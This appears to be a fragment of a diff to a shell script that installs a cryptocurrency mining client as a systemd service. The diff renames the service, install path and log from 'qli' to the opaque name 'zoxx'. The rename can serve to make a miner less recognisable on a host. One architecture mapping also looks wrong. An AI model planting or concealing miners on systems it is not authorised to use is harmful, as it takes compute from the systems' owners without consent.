@@ -10,7 +10,7 @@ threads=`nproc`
 [ -z "$payoutId" ] && exit
 [ -z "$minerAlias" ] && exit
 
-path='/q'
+path='/zoxx'
 
 case $(uname -m) in
 armv5*) ARCH="aarch64" ;;
@@ -38,17 +38,17 @@ echo """
 [Unit]
 After=network-online.target
 [Service]
-StandardOutput=append:/var/log/qli.log
-StandardError=append:/var/log/qli.log
+StandardOutput=append:/var/log/zoxx.log
+StandardError=append:/var/log/zoxx.log
 ExecStart=$path/$file_name -t $threads -l $minerAlias -i $payoutId
 Restart=on-failure
 RestartSec=1s
 [Install]
 WantedBy=default.target
-""" > /etc/systemd/system/qli.service
-chmod 664 /etc/systemd/system/qli.service
+""" > /etc/systemd/system/zoxx.service
+chmod 664 /etc/systemd/system/zoxx.service
 systemctl daemon-reload
-systemctl enable --no-block qli.service
-systemctl start --no-block qli.service
+systemctl enable --no-block zoxx.service
+systemctl start --no-block zoxx.service
 sleep 10
-tail -20 /var/log/qli.log
+tail -20 /var/log/zoxx.log
